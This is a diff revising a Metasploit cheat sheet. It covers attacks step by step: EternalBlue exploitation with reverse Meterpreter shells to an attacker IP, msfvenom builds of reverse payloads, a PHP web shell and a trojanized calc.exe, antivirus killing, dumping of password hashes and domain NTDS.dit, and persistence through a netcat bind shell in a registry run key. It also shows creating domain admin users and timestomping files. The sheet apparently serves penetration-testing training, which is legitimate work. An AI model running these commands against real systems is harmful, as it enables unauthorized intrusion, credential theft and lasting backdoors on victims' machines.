@@ -6,12 +6,12 @@ Metasploit
 service postgresql start                          Start the postgresql db
 msfdb init                                        Create and initialize the msf db
 msfconsole                                        Start Metasploit
-db_status                                                                                                                                                                                                                                                                                                                                              Confirm that Metasploit is connected to the db
+db_status                                         Show the current data service status
 ------------------------------------------------------------------------------------------------------
 
 # Troubleshooting
 
-- If the db connection fails:
+- If the db connection fails
 exit
 cat /usr/share/metasploit-framework/config/database.yml
 Copy the password.
@@ -34,23 +34,24 @@ msfconsole
 db_status
 
 - Module database cache not built yet, using slow search
-db_rebuild_cache                                  Rebuilds the database-stored module cache
+db_rebuild_cache                                  Rebuilds the database-stored module cache (deprecated)
 ------------------------------------------------------------------------------------------------------
 
 # Help
 
-help or ?                                         Show available commands and their descriptions
+help or ?                                         Show commands and their descriptions
+<command> -h                                      Get help on any command
 grep -h                                           Show help on the 'grep' command
 ------------------------------------------------------------------------------------------------------
 
 # Searching
 
-search <string>
-search ms17                                       Show all Microsoft exploits released in 2017
+search <string>                                   Searches module names and descriptions
+search ms17                                       Show all Microsoft exploits relative to 2017
 
 grep <string> search <type>
-grep php search payloads                          Search payloads then grep for php
-grep linux show post                              Search post exploitation modules then grep for linux
+grep php search payloads                          Search payloads and grep for php
+grep linux show post                              Search post exploitation modules and grep for linux
 grep -v gather search post/windows
 ------------------------------------------------------------------------------------------------------
 
@@ -60,81 +61,58 @@ show <all, auxiliary, encoders, exploits, nops, options, payloads, plugins, post
 
 use <auxiliary, encoder, exploit, nop, payload, post>
 
-use exploit/windows/smb/ms17_010_eternalblue
-show info
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue      Set the exploit module
+show info                                         Show basic info on the exploit
 show targets                                      Show OSs that can be targeted with this exploit
-set rhost <target IP>
+set rhost <target IP>                             Set the target IP
 show payloads                                     Show payloads that work with this exploit
-set payload windows/x64/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp   Set the payload module
 show options                                      Show remaining options for the payload
 set lhost <attacker IP>                           Set to the attacker's IP
-set lport <attacker port>                         Set the listening port to 443
-show advanced
-show evasion
+set lport <attacker port>                         Set to the attacker's listening port to 443
+show targets                                      Show target options
+show advanced                                     Show advanced options
+show evasion                                      Show evasion options
 exploit                                           Run the exploit
 ------------------------------------------------------------------------------------------------------
 
-# Payloads
+# Generate payloads
 
 msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
 
-- Generate a bind payload that avoids a bad character:
+- Generate a bind payload that avoids a bad character
 msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
 
-- Generate a bind payload and encode it 3 times:
+- Generate a bind payload and encode it 3 times
 msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 
-- Inject a bind payload into calc.exe and save it as an executable:
+- Inject a bind payload into calc.exe and save it as an executable
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
 
-- Generate a reverse payload and save it as an executable:
+- Generate a reverse payload and save it as an executable
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe
 
-- Generate PHP web shell and upload to a web server:
+- Generate PHP web shell and upload to a web server
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -a php -e php/base64 -f raw -o /root/webshell.php
 upload /root/webshell.php /var/www/
-use exploit/multi/handler
-set PAYLOAD php/meterpreter/reverse_tcp
 ------------------------------------------------------------------------------------------------------
 
-# Database
+# Sessions
 
-workspace                                         Show workspaces (* shows the active workspace)
-* default
-  client1
-  client2
+sessions -h                                       Show help on the sessions command
+sessions -l                                       Show active sessions
+sessions -i 2                                     Interact with session 2
+ctrl z                                            Background the current session
 
-workspace client1                                 Switch workspace
-
-workspace                                         List workspaces
-  default
-* client1                                         * shows the active workspace
-  client2
-
-workspace -a <name>                               Add workspace(s)
-workspace -d <name>                               Delete workspace(s)
-workspace -r <old> <new>                          Rename workspace
-
-db_import <path to file>
-hosts                                             Confirm hosts have been imported
-
-db_export -f xml /root/msf.xml                    Backup db in xml format
-
-hosts -h                                          Show help on the host command
-services -h                                       Show help on the services command
-
-services -c port,protocol,name                    Show specific columns
-services -p 22                                    Search for a specific port
-services -s http                                  Search for a specific service
-
-creds
-loot -h                                           Show help on the loot command
+Many options allow specifying session ranges using commas and dashes. For example:
+     sessions -s checkvm -i 1,3-6
+     sessions -k 1-3,6                            Terminate sessions
 ------------------------------------------------------------------------------------------------------
 
 # Meterpreter
 
-You will need to be at a Meterpreter prompt (meterpreter >) instead of a Metasploit prompt (msf >) 
-to run Meterpreter commands.
+You will need to be at a Meterpreter prompt (meterpreter >) instead of a Metasploit prompt (msf >)
 
 help
 background                                        Send the current session to the background, and return to the 'msf' prompt
@@ -167,19 +145,7 @@ webcam_list                                       Show currently available web c
 webcam_snap                                       Takes a picture from the web cam
 ------------------------------------------------------------------------------------------------------
 
-# Sessions
-
-sessions -h                                       Show help on the sessions command
-sessions -l                                       Show active sessions
-sessions -i 2                                     Interact with session 2
-ctrl z                                            Background the current session
-
-Many options allow specifying session ranges using commas and dashes. For example:
-     sessions -s checkvm -i 1,3-6
-     sessions -k 1-3,6
-------------------------------------------------------------------------------------------------------
-
-# Post exploitation
+# Initial post exploitation - Windows
 
 sysinfo                                           Gets information about the remote system, such as OS
 getuid                                            Get the user that the server is running as
@@ -229,15 +195,26 @@ exploit
 use exploit/windows/local/                        There are currently 77 options - 12/29/19
 ------------------------------------------------------------------------------------------------------
 
-# Dump hashes
+# Windows enumeration
+
+use post/windows/gather/enum_domain               Identifies the primary domain via the registry
+use post/windows/gather/enum_domains              Enumerates the domains a host can see and the domain controllers for that domain
+use post/windows/gather/enum_logged_on_users      Enumerate current and recently logged on Windows users
+use post/windows/gather/enum_shares               Enumerate configured and recently used file shares
+
+run killav
+run getcountermeasure
+run winenum
+------------------------------------------------------------------------------------------------------
+
+# Dump hashes and creds
 
 ps                                                Show running processes
 migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM
 hashdump                                          Dump password hashes
 
-run post/windows/gather/credentials/credential_collector
-run post/windows/gather/credentials/domain_hashdump        This only works on a DC
-run post/windows/gather/credentials/gpp
+use post/windows/gather/credentials/credential_collector     Harvests credentials found on the host
+use post/windows/gather/credentials/gpp
 ------------------------------------------------------------------------------------------------------
 
 # Mimikatz
@@ -279,14 +256,14 @@ getuid
 
 # Establish persistence
 
-Option 1:
+Option 1
 run persistence -h
 run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
 run persistence -X -i 30 -p 443 -r <target IP>
 Notice that it shows where the file is stored on the Windows machine.
 It also gives you the location of the Meterpreter resource file you can run to remove persistence.
 
-Example:
+Example
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
@@ -295,11 +272,11 @@ set ExitOnSession false
 set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
 exploit -j -z
 
-Option 2 - Add a user:
+Option 2 - Add a user
 add_user <user> <password> -h <target IP>
 add_group_user "Domain Admins" <user> -h <target IP>
 
-Option 3 - Scheduled:
+Option 3 - Scheduled
 info exploit/windows/local/s4u_persistence
 
 Notice the trigger methods: event, lock, logon, schedule, unlock
@@ -309,53 +286,39 @@ set session 1
 set TRIGGER lock
 exploit
 
-Option 4 - Volume Shadow Copy:
+Option 4 - Volume Shadow Copy
 use exploit/windows/local/vss_persistence
 set session 1
 set RHOST <target IP>
 set LPORT 4445  <———use a different port number
 exploit
 
-Option 5 - Upload netcat:
+Option 5 - Upload netcat
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
 
 - If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
 This lets you automatically establish persistence, without having to think about it.
 
-Check for anything the runs at startup.
+Check for anything the runs at startup
 meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
 
-Add a registry key.
+Add a registry key
 meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 443 -e cmd.exe'
 
-Verify changes to the registry.
+Verify changes to the registry
 meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat
 
-Reboot the target system.
+Reboot the target system
 meterpreter >  reboot
 
-Connect to target system - option 1:
+Connect to target system - option 1
 Open a new Terminal: nc -vn <target IP> 443
 
-Connect to target system - option 2:
+Connect to target system - option 2
 use multi/handler
 set PAYLOAD windows/shell_bind_tcp
 set RHOST <target IP>
 exploit
-------------------------------------------------------------------------------------------------------
-
-# Enumeration
-
-run killav
-run getcountermeasure
-run winenum
-run post/windows/gather/checkvm
-run post/windows/gather/enum_applications
-run post/windows/gather/enum_logged_on_users
-run post/windows/gather/enum_shares
-run post/windows/gather/enum_snmp
-run post/windows/gather/usb_history
-reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 ------------------------------------------------------------------------------------------------------
 
 # Upload tools
@@ -390,6 +353,35 @@ set THREADS 10
 run
 ------------------------------------------------------------------------------------------------------
 
+# Post exploitation - domain controller (DC)
+
+use post/windows/gather/credentials/domain_hashdump       Attempts to copy the NTDS.dit database and parse
+                                                          out all of the User Accounts. It saves all of the
+                                                          captured password hashes, including historical ones
+use post/windows/gather/enum_ad_computers         Windows Gather Active Directory Computers
+use post/windows/gather/enum_ad_groups            Windows Gather Active Directory Groups
+use post/windows/gather/enum_ad_managedby_groups  Windows Gather Active Directory Managed Groups
+use post/windows/gather/enum_ad_service_principal_names   Windows Gather Active Directory Service Principal Names
+use post/windows/gather/enum_ad_to_wordlist       Windows Active Directory Wordlist Builder
+use post/windows/gather/enum_ad_user_comments     Windows Gather Active Directory User Comments
+use post/windows/gather/enum_ad_users             Windows Gather Active Directory Users
+use post/windows/gather/enum_domain_users         Windows Gather Enumerate Active Domain Users
+
+- Add any user in Active Directory
+use windows/manage/add_user_domain
+set addtodomain true
+set username hacker
+set password w00t!
+set session 1
+exploit
+
+- Delete any user in Active Directory
+use windows/manage/delete_user
+set username hacker
+set session 1
+exploit
+------------------------------------------------------------------------------------------------------
+
 # Cross platform exploit
 
 - Windows
@@ -410,36 +402,6 @@ set payload python/meterpreter/reverse_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# Post exploitation of a domain controller (DC)
-
-
-run windows/gather/enum_ad_computers              Find all Active Directory users
-run windows/gather/enum_logged_on_users           Enumerate all logged on users
-run windows/gather/enum_ad_groups                 Gather all Groups in Active Directory
-run windows/gather/enum_shares                    Find all shared folders in Active Directory
-
-
-- Add any user in Active Directory
-run windows/manage/add_user_domain
-set addtodomain true
-set username hacker
-set password w00t!
-set session 1
-exploit
-
-- Delete any user in Active Directory
-run windows/manage/delete_user
-set username hacker
-set session 1
-exploit
-
-run windows/gather/enum_ad_computers              Windows Gather Active Directory Computers
-run windows/gather/enum_ad_groups                 Windows Gather Active Directory Groups
-run windows/gather/enum_ad_users                  Windows Gather Active Directory Users
-run windows/gather/enum_domain                    Windows Gather Enumerate Domain
-run windows/gather/enum_domains                   Windows Gather Domain Enumeration
-------------------------------------------------------------------------------------------------------
-
 # Misc
 
 idletime                                          Returns the number of seconds the remote user has been idle
@@ -455,4 +417,38 @@ timestomp                                         Manipulate file MACE attribute
 run vnc
      If the screen is locked exit VNC
      Run screen_unlock
+------------------------------------------------------------------------------------------------------
+
+# Database
+
+db_import <file>                                  Import a scan result file (filetype will be auto-detected)
+db_export -f <xml or pwdump> <file>               Export a file containing the contents of the database
+
+workspace                                         List workspaces (* shows the active workspace)
+* default
+  client1
+  client2
+
+workspace client1                                 Switch workspace
+
+workspace                                         List workspaces
+  default
+* client1                                         * shows the active workspace
+  client2
+
+workspace -a <name>                               Add workspace(s)
+workspace -d <name>                               Delete workspace(s)
+workspace -D                                      Delete all workspaces
+workspace -r <old> <new>                          Rename workspace
+
+creds                                             List all credentials in the database
+hosts                                             List all hosts in the database
+loot                                              List all loot in the database
+notes                                             List all notes in the database
+services                                          List all services in the database
+vulns                                             List all vulnerabilities in the database
+
+services -c port,protocol,name                    Show specific columns
+services -p 22                                    Search for a specific port
+services -s http                                  Search for a specific service
 
